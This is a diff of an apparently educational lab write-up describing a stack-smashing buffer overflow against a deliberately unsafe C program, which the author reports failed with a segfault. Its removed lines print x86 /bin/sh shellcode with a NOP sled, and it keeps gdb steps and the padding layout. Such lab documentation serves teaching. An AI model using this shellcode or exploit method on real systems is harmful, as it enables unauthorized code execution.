@@ -2,7 +2,7 @@
 
 # Stack Smashing Attack: Exploiting Buffer Overflow to Execute Arbitrary Shellcode
 
-# Description of the attack
+# Introduction - Description of the attack
 
 In this demo, I demonstrate a classic stack-based buffer overflow attack, also known as a stack smashing attack. My goal was to overflow the buffer and overwrite the return address on the stack so that, when the vulnerable function returned, the execution would jump to my injected shellcode. The shellcode was designed to launch a shell (/bin/sh). If successful, this would give me arbitrary command execution from within the vulnerable program, simulating how attackers exploit memory vulnerabilities to gain control over a system. I wrote a simple C program containing a function that defines a fixed-size buffer on the stack. This function uses the unsafe gets() function to read user input, which doesn’t perform any bounds checking. As a result, when I supplied more input than the buffer can hold, I was able to overwrite adjacent memory on the stack—including the saved return address of the function.
 
@@ -10,27 +10,19 @@ However, the exploit was not successful. Despite trying multiple payload offsets
 
 
 ## Environment Setup
-The demonstration was carried out on Ubuntu MATE 25.04 "Plucky Puffin" (64-bit) and the following tools and packages:
+The demonstration was carried out on Ubuntu MATE 25.04 "Plucky Puffin" (64-bit) with the following packages installed:
 
 ```
-sudo apt install gcc-multilib
-sudo apt install gdb
-sudo apt install python3
-sudo apt install execstack
+sudo apt install gcc-multilib   //for compiling 32-bit C programs
+sudo apt install gdb            // for stack memory inspection
+sudo apt install python3        // for running python programs
+sudo apt install execstack      // makes stack executable
 ```
 
-gcc-multilib: for compiling 32-bit C programs
-
-gdb: GNU Debugger, used to inspect stack memory and find return address offsets
-
-python3: to generate and save the malicious payload into a file 
-
-execstack: makes the stack executable (required for running shellcode from stack)
-
-Here are the steps that was carried out:
+Here are the steps that were carried out:
 
 ## Step 1: Creating a Vulnerable Program
-I wrote a simple C program (vuln.c) with a function that uses the unsafe gets() function to read user input into a local buffer. This introduced a buffer overflow vulnerability, as gets() does not check the length of the input.
+I generated a simple C program (vuln.c) with a function that uses the unsafe gets() function to read user input into a local buffer. This introduced a buffer overflow vulnerability, as gets() does not check the length of the input.
 
 ```
 /*  vuln.c  ── deliberately unsafe  */
@@ -69,46 +61,11 @@ gcc -m32 -fno-stack-protector -z execstack -no-pie vuln.c -o vuln
 ```
 
 ## Step 3: Writing the Exploit Payload
-I created a Python script (exploit.py) to generate a payload containing:
+I generated a Python script (exploit.py) to generate a payload containing:
 
-A sequence of NOP (\x90) instructions added before the shellcode to execute /bin/sh. The purpose is to increase the chance of successful redirection so that if the return address lands anywhere in the NOP sled, the processor will “slide” down the NOPs until it reaches the shellcode.
+A sequence of NOP (\x90) instructions and a shellcode to execute /bin/sh. The purpose of the NOP sled is to increase the chance of successful redirection so that if the return address lands anywhere in the NOP sled, the processor will “slide” down the NOPs until it reaches the shellcode.
 
-
-3. A guessed return address pointing somewhere into the NOP sled or shellcode
-
-```
-shellcode = (
-b"\x90" * 100 +  # NOP sled
-b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"  # push //sh
-b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"  # push /bin, mov ebx
-b"\x53\x89\xe1\x99\xb0\x0b\xcd\x80"  # execve syscall
-)
-
-```
-
-## Step 4: Finding the Offset and ESP Location with GDB
-I ran the compiled program in gdb and set breakpoints to pause execution before the return. Using info registers and x/32x $esp, I inspected the stack to estimate the correct memory location where the shellcode would be placed.
-```
-gdb ./vuln
-(gdb) break gets
-(gdb) run
-(gdb) info registers esp
-(gdb) x/32x $esp
-```
-I used the output to guess a return address that would point into the NOP sled or shellcode.
-
-## Step 5: Generating the Final Payload
-In this step, I wrote a Python script to generate the final exploit payload. This payload is designed to:
-
-Fill the buffer with 76 bytes of padding ("A" * 76) to reach the saved return address. 
-
-Overwrite the return address with the address of the buffer (0xffffcd60) where the shellcode is located.
-
-Include a NOP sled of 100 bytes to increase the success rate of the jump.
-
-Append shellcode that launches a shell (/bin/sh).
-
-Here is the content of the exploit.py script:
+The payload is designed to fill the buffer with 76 bytes of padding ("A" * 76) to overwrite the saved return address with the address of the buffer where the shellcode is located.
 
 ```
 # exploit.py
@@ -146,7 +103,20 @@ python3 exploit.py
 This creates a file named payload, which can then be passed as input to the vulnerable program.
 
 
-## Step 6: Executing the Exploit
+
+## Step 4: Finding the Offset and ESP Location with GDB
+I ran the compiled program in gdb and set breakpoints to pause execution before the return. Using info registers and x/32x $esp, I inspected the stack to estimate the correct memory location where the shellcode would be placed.
+```
+gdb ./vuln
+(gdb) break gets
+(gdb) run
+(gdb) info registers esp
+(gdb) x/32x $esp
+```
+I used the output to guess a return address that would point into the NOP sled or shellcode.
+
+
+## Step 5: Executing the Exploit
 I passed the payload to the vulnerable program using input redirection:
 
 ```
@@ -154,7 +124,7 @@ I passed the payload to the vulnerable program using input redirection:
 ```
 
 ## Step 7: Observing the Result
-Instead of launching a shell, the program crashed with a segmentation fault. Despite adjusting the return address and inspecting the stack several times, I wasn't able to redirect execution to my shellcode.
+Instead of launching a shell, the program crashed with a segmentation fault. Despite adjusting the return address and inspecting the stack several times, I wasn't able to redirect execution to my shellcode. I researched and realized the segmentation fault is the inability of the program to return or locate the shellcode placed in the memory stack.
 
 Seg error pic here
 
